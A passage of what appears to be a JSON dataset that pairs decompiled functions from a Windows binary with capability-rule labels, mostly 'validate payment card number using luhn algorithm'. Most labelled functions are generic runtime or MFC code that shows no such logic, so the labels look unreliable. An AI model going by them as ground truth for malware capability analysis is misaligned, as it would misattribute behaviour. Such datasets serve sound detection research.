        "decompiled_code": "\nint32_t __thiscall fcn.00411270(uint param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    fcn.00410eb0(param_2, param_3, param_4, param_1, param_4, unaff_EDI, unaff_ESI, unaff_retaddr, param_2, param_3);\n    return param_3 * 0x10 + param_2;\n}\n",
        "token_count": 127
    },
    "00411a2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00411a2f(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041ccc0(param_1, param_2, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 62
    },
    "00411acd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00411acd(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.004275b6();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 106
    },
    "0041280c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041280c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.0041265b();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_ch + 10, \"DISPLAY\", 0x20);\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x449088)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 420
    },
    "0041300e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041300e(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004275b6();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 103
    },
    "00413226": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00413226(uint param_1)\n\n{\n    fcn.0041cc60(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 43
    },
    "00413378": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413378(uint param_1)\n\n{\n    fcn.0041cc60(param_1, 0, 0x10);\n    return;\n}\n",
        "token_count": 38
    },
    "0041338b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041338b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint vtime;\n    uint var_ah;\n    ushort var_6h;\n    ushort var_4h;\n    \n    fcn.0041cc60(&vtime, 0, 0x10);\n    vtime._0_2_ = arg_8h;\n    vtime._2_2_ = arg_ch;\n    var_ah._0_2_ = arg_10h;\n    var_ah._2_2_ = arg_14h;\n    var_6h = arg_18h;\n    var_4h = arg_1ch;\n    iVar1 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)(&vtime);\n    *(in_ECX + 8) = iVar1 == 0;\n    return;\n}\n",
        "token_count": 239
    },
    "004149b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.004149b3(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    uint var_14h;\n    uint var_ch;\n    \n    fcn.0041c77c();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[1] = iVar1;\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    iVar1 = fcn.00428fb1(iVar1 << 3);\n    *extraout_ECX = iVar1;\n    iVar1 = *extraout_ECX;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return (-(iVar1 != 0) & 0x7ff8fff2) + 0x8007000e;\n}\n",
        "token_count": 320
    },
    "00414a17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414a17(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = (**(*arg_18h + 0x10))\n                      (arg_18h, (*(arg_8h + 0x24) != 0) * '\\x02' + '\\x02', arg_ch, arg_8h, arg_14h, arg_10h, 0);\n    if (arg_ch != 0) {\n        puVar2 = arg_8h + 0x14;\n        do {\n            fcn.00428fdc(*puVar2);\n            puVar2 = puVar2 + 0xd;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 213
    },
    "00414cfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00414cfb(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h, uint arg_ch, \n            uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    uVar3 = *(unaff_EBP + 0xc);\n    uVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(extraout_ECX + 8) = uVar3;\n    *(extraout_ECX + 0x18) = uVar1;\n    *(extraout_ECX + 0x10) = iVar2;\n    *(extraout_ECX + 0x14) = 0;\n    fcn.0041cc60(uVar3, 0, uVar1);\n    fcn.00428fdc(*(extraout_ECX + 0xc));\n    *(extraout_ECX + 0xc) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00428fb1(iVar2 * 0x34);\n    *(extraout_ECX + 0xc) = uVar3;\n    iVar2 = *(extraout_ECX + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return (-(iVar2 != 0) & 0x7ff8fff2) + 0x8007000e;\n}\n",
        "token_count": 480
    },
    "00414d83": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414d83(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t in_ECX;\n    \n    if (arg_1ch == 0) {\n        arg_1ch = 0;\n    }\n    else {\n        arg_1ch = arg_1ch - *(in_ECX + 8);\n    }\n    if (arg_18h == 0) {\n        arg_18h = 0;\n    }\n    else {\n        arg_18h = arg_18h - *(in_ECX + 8);\n    }\n    fcn.00414a61(*(in_ECX + 0x14) * 0x34 + *(in_ECX + 0xc), arg_8h, arg_ch, arg_10h, 0, 0, 0, arg_14h - *(in_ECX + 8), \n                 arg_18h, arg_1ch, 0);\n    *(in_ECX + 0x14) = *(in_ECX + 0x14) + 1;\n    return;\n}\n",
        "token_count": 268
    },
    "00414ddd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nbool fcn.00414ddd(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = *(extraout_ECX + 0x38);\n    iVar2 = *(extraout_ECX + 0x30);\n    *(unaff_EBP + -0x14) = *(extraout_ECX + 0x34) - *(extraout_ECX + 0x2c);\n    *(unaff_EBP + -0x10) = iVar1 - iVar2;\n    fcn.0042f1a0(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.004309e4(unaff_EBP + -0x14);\n    iVar1 = (**(**(extraout_ECX + 0x4c) + 0x44))(*(extraout_ECX + 0x4c), 1, unaff_EBP + -0x14);\n    if (-1 < iVar1) {\n        iVar2 = (**(**(extraout_ECX + 0x4c) + 0x48))(*(extraout_ECX + 0x4c), 1, unaff_EBP + -0x14);\n        if (-1 < iVar2) {\n            fcn.00430a72(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x34) = *(extraout_ECX + 0x2c) + *(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x38) = *(extraout_ECX + 0x30) + *(unaff_EBP + -0x10);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042f1fb();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return -1 < iVar1;\n}\n",
        "token_count": 502
    },
    "0041528d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041528d(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *var_4h;\n    \n    puVar1 = param_1 + 0x74;\n    var_4h = param_1;\n    fcn.0041cc60(puVar1, 0, 0x10);\n    var_4h = NULL;\n    *puVar1 = 0x10;\n    iVar2 = (****(param_1 + 0x4c))(*(param_1 + 0x4c), 0x43c1ac, &var_4h);\n    if (-1 < iVar2) {\n        (**(*var_4h + 0xc))(var_4h, puVar1);\n        (**(*var_4h + 8))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "004160a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004160a0(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    param_3[1] = puVar1[1];\n    param_3[2] = puVar1[2];\n    param_3[3] = puVar1[3];\n    *(param_3 + 4) = *(puVar1 + 4);\n    *(param_3 + 0x12) = *(puVar1 + 0x12);\n    return;\n}\n",
        "token_count": 175
    },
    "004160c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004160c6(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    *(param_3 + 1) = *(puVar1 + 1);\n    return;\n}\n",
        "token_count": 111
    },
    "004160e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004160e8(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    param_3[1] = puVar1[1];\n    param_3[2] = puVar1[2];\n    param_3[3] = puVar1[3];\n    return;\n}\n",
        "token_count": 135
    },
    "0041610b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041610b(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *puVar1 = *param_3;\n    puVar1[1] = param_3[1];\n    puVar1[2] = param_3[2];\n    puVar1[3] = param_3[3];\n    return;\n}\n",
        "token_count": 135
    },
    "00416200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00416200(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    cVar1 = fcn.00414bbf(&stack0x00000004);\n    if (cVar1 == '\\0') {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    }\n    return iVar2;\n}\n",
        "token_count": 131
    },
    "004170b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004170b4(uint32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((arg_8h & 3) == 0) || (uVar1 = 0,  arg_ch == 0)) {\n        return 0;\n    }\ncode_r0x004170d8:\n    // switch table (31 cases) at 0x417149\n    switch(*arg_10h) {\n    case 1:\n        var_4h = 3;\n        break;\n    case 2:\n    case 0x14:\n        var_4h = 5;\n        break;\n    case 3:\n    case 9:\n    case 10:\n    case 0x17:\n        var_4h = 6;\n        break;\n    default:\n        goto code_r0x004170ee;\n    case 6:\n    case 7:\n    case 8:\n    case 0xb:\n    case 0xc:\n    case 0xf:\n    case 0x10:\n    case 0x13:\n    case 0x15:\n        var_4h = 7;\n        break;\n    case 0x18:\n        var_4h = 2;\n        break;\n    case 0x19:\n        var_4h = 1;\n        break;\n    case 0x1f:\n        var_4h = 4;\n    }\n    var_20h = 0xffffffff;\n    var_24h = 3;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_8h = arg_14h;\n    fcn.00415487(&var_24h);\n    return var_ch;\ncode_r0x004170ee:\n    uVar1 = uVar1 + 1;\n    arg_10h = arg_10h + 10;\n    if (arg_ch <= uVar1) {\n        return 0;\n    }\n    goto code_r0x004170d8;\n}\n",
        "token_count": 531
    },
    "00419336": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00419336(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00428b07();\n    pcVar1 = *(unaff_EBP + 8);\n    extraout_ECX[10] = 0xffffffff;\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.COleControlSite.0;\n    extraout_ECX[7] = pcVar1;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    extraout_ECX[0x1c] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    extraout_ECX[0x23] = NULL;\n    extraout_ECX[0x24] = NULL;\n    extraout_ECX[0x25] = NULL;\n    extraout_ECX[0x26] = NULL;\n    extraout_ECX[0x27] = NULL;\n    fcn.00401400();\n    *(unaff_EBP + -4) = 1;\n    extraout_ECX[0x29] = NULL;\n    fcn.00434553();\n    extraout_ECX[0x30] = NULL;\n    extraout_ECX[0x31] = vtable.COleControlSite::XOleClientSite.0;\n    extraout_ECX[0x32] = vtable.COleControlSite::XOleIPSite.0;\n    extraout_ECX[0x33] = vtable.COleControlSite::XOleControlSite.0;\n    extraout_ECX[0x34] = vtable.COleControlSite::XAmbientProps.0;\n    extraout_ECX[0x35] = vtable.COleControlSite::XPropertyNotifySink.0;\n    extraout_ECX[0x36] = vtable.COleControlSite::XEventSink.0;\n    extraout_ECX[0x37] = vtable.COleControlSite::XBoundObjectSite.0;\n    extraout_ECX[0x38] = vtable.COleControlSite::XNotifyDBEvents.0;\n    extraout_ECX[0x39] = vtable.COleControlSite::XRowsetNotify.0;\n    fcn.0041cc60(extraout_ECX + 0x2a, 0, 0x10);\n    uVar2 = *(unaff_EBP + -0xc);\n    *(extraout_ECX + 0x2a) = 0;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 796
    },
    "0041a6d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a6d3(int32_t param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_retaddr;\n    \n    if (*(param_1 + 0x4c) != 0) {\n        fcn.00414ff7(param_2);\n        return;\n    }\n    uVar1 = fcn.0041a115(param_1, 0);\n    if (((-(unaff_retaddr != 0) & 0x10U) + 0x10 & uVar1) != 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0xf4, unaff_retaddr != 0, 1);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0041b42d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b42d(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x0041b456. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 90
    },
    "0041b954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041b954(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0xc;\n    fcn.0041cd84();\n    *(unaff_EBP + -0x1c) = 0;\n    iVar2 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + 8) = *(unaff_EBP + 8) + iVar2 * *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        piVar1 = unaff_EBP + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) break;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) - iVar2;\n        (**(unaff_EBP + 0x14))();\n    }\n    *(unaff_EBP + -0x1c) = 1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041b99c(0x43ad58, arg_ch_00, unaff_retaddr, arg_8h);\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 366
    },
    "0041bf8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bf8a(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.00420268(&var_20h, arg_ch, arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.004200c1(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 220
    },
    "0041bfe1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bfe1(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    fcn.00420268(&var_20h, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 118
    },
    "0041c9d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c9d9(uchar *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = arg_ch;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.00420268(&var_20h, arg_10h, &arg_14h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.004200c1(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 229
    },
    "0041ca30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ca30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_14h = 0x49;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    var_1ch = fcn.0041c6f0();\n    fcn.00421854(&var_20h, arg_ch, &arg_10h, arg_8h);\n    return;\n}\n",
        "token_count": 137
    },
    "0041cabe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041cabe(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x444238 != NULL) {\n        (**0x444238)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x443070;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x443084);\n    if (iVar1 == 0) {\n        fcn.0041be09(0x421572);\n        ppcVar2 = 0x443000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x44306c);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 252
    },
    "0041ce28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041ce28(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "0041d842": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041d842(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0041d683(param_1, param_2, param_3, 0);\n    return;\n}\n",
        "token_count": 52
    },
    "0041d859": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041d859(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0041d683(param_1, param_2, param_3, 1);\n    return;\n}\n",
        "token_count": 52
    },
    "0041da34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041da34(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041e005();\n    return iVar1 + 8;\n}\n",
        "token_count": 43
    },
    "0041da3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041da3d(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041e005();\n    return iVar1 + 0xc;\n}\n",
        "token_count": 45
    },
    "0041e927": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041e927(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43af30, 0x40);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = arg_10h_00;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x38) = *(arg_8h_00 + -4);\n    uVar1 = fcn.0041b71a(unaff_EBP + -0x50, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x3c) = uVar1;\n    iVar2 = fcn.0041e005();\n    *(unaff_EBP + -0x40) = *(iVar2 + 0x7c);\n    iVar2 = fcn.0041e005();\n    *(unaff_EBP + -0x44) = *(iVar2 + 0x80);\n    iVar2 = fcn.0041e005();\n    *(iVar2 + 0x7c) = iVar3;\n    iVar3 = fcn.0041e005();\n    *(iVar3 + 0x80) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.0041b7af(arg_8h_00, *(unaff_EBP + 0x14), arg_10h_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n    